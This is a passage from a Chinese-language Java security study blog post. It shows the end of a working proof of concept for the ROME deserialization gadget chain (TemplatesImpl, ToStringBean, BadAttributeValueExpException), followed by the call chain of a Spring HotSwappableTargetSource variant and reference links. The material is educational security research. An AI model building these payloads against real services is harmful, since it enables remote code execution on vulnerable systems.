        error.setSuperclass(abstractTranslet);
        // 将 Error 对象输出成字节数组
        byte[] errorBytecode = error.toBytecode();

        // 新建利用链 TemplatesImpl 对象
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setValue(templatesImpl, "_name", "aaa");
        setValue(templatesImpl, "_bytecodes", new byte[][]{errorBytecode});
        setValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // 利用 ToStringBean 的 toString() 方法调用 TemplatesImpl 的 getOutputProperties() 方法
        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);

        // BadAttributeValueExpException 的 readObject 方法会调用 val 属性的 toString 方法
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(new HashMap());
        // 为防止调用构造方法命令执行，选择反射修改 val 属性值
        setValue(badAttributeValueExpException, "val", toStringBean);

        // 序列化成字节数组
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(badAttributeValueExpException);
        oos.flush();
        oos.close();

        // 反序列化字节数组
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    // 反射设置属性值的过程可以抽离成一个方法
    public static void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

### HotSwappableTargetSource 链

spring 原生的 toString 利用链。

调用链如下

-   HashMap.readObject
-   HashMap.putVal
-   HotSwappableTargetSource.equals
-   XString.equals
-   ToStringBean.toString

这个链子由于作者第一次接触，需要完整分析一下，内容过长，所以单独写了一篇文章。

参见：[漏洞篇 - Rome 链之 HotSwappableTargetSource 利用链](https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E9%93%BE%E4%B9%8BHotSwappableTargetSource%E9%93%BE/)

## 参考文章

[Java 安全学习 —— ROME 反序列化](https://goodapple.top/archives/1145)

[ROME 反序列化](https://www.yuque.com/5tooc3a/jas/mhy3k7vcrdteappp#amGm1)
